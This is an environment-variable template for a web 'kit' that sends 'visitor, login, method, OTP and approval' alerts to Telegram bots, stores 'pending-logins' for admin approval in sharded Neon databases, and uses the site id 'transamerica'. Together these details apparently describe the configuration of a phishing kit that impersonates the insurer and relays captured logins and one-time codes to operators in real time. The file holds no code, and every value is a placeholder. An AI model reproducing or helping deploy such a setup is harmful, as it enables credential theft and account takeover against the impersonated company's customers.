# ---------------------------------------------------------------------------
# env.example — copy to .env.local and fill in your own values.
# Never commit real secrets. See NEON_DATABASE_RULES.md + env_readme.md.
# ---------------------------------------------------------------------------

# --- Telegram ops (visitor + login + method + OTP + approval alerts) --------
TELEGRAM_BOT_TOKEN=123456789:replace-with-your-ops-bot-token
# Comma-separated chat ids for the ops channel.
TELEGRAM_CHAT_ID=111111111,222222222

# --- Telegram SEO admin (crawler / search alerts) --------------------------
# SEO admin Telegram — IndexNow deploy notify + SEO alerts
# Required on Vercel Build env (not Runtime-only) for IndexNow Telegram on deploy
TELEGRAM_SEO_BOT_TOKEN=987654321:replace-with-your-seo-bot-token
TELEGRAM_SEO_ADMIN=333333333

# --- Admin portal ----------------------------------------------------------
# Origin only — no /admin/login path, no query string.
ADMIN_PORTAL_URL=https://your-control-center-deploy.example.com

# --- Site identity ---------------------------------------------------------
# Control Center / Telegram display name is a code constant in lib/site-url.ts.
# SITE_ID is only needed when lib/project-config.ts is absent.
# SITE_ID=transamerica

# --- Neon (pending-logins / admin approval) -------------------------------
# DB 1 (shard 0) is the official primary and is NOT cc_id filtered.
DATABASE_URL=postgresql://user:password@ep-example.us-east-2.aws.neon.tech/neondb?sslmode=require
# DB 2 … DB 10 are shared primary shards and REQUIRE CC_ID.
# DB_2=postgresql://user:password@ep-example-two.us-east-2.aws.neon.tech/neondb?sslmode=require
# DB_3=
# DB_4=
# DB_5=
# DB_6=
# DB_7=
# DB_8=
# DB_9=
# DB_10=
# Backup is tried last, after every primary shard fails. Requires CC_ID.
# DATABASE_BACKUP_FALLBACK=postgresql://user:password@ep-backup.us-east-2.aws.neon.tech/neondb?sslmode=require
# Pod identity — must byte-match the admin portal deploy. Required for DB_2…DB_10 and backup.
# CC_ID=transamerica
# DB_1 is a silent legacy alias only — do not set it.
# Optional diagnostics:
# NEON_PROJECT_ID_1=
# NEON_PROJECT_ID_2=
# NEON_PROJECT_ID_3=
# NEON_PROJECT_ID_4=
# NEON_PROJECT_ID_5=
# NEON_PROJECT_ID_6=
# NEON_PROJECT_ID_7=
# NEON_PROJECT_ID_8=
# NEON_PROJECT_ID_9=
# NEON_PROJECT_ID_10=

# --- Local development -----------------------------------------------------
# Unlocks local testing gates. Ignored on production Vercel deploys.
ALLOW_LOCAL_TESTING=1
# Only meaningful together with the kit's crawler-SEO preview wiring (Step 5).
# CSP=1
# CRON_SECRET=your-cron-secret
# TURNSTILE_SECRET_KEY=your-turnstile-secret-key
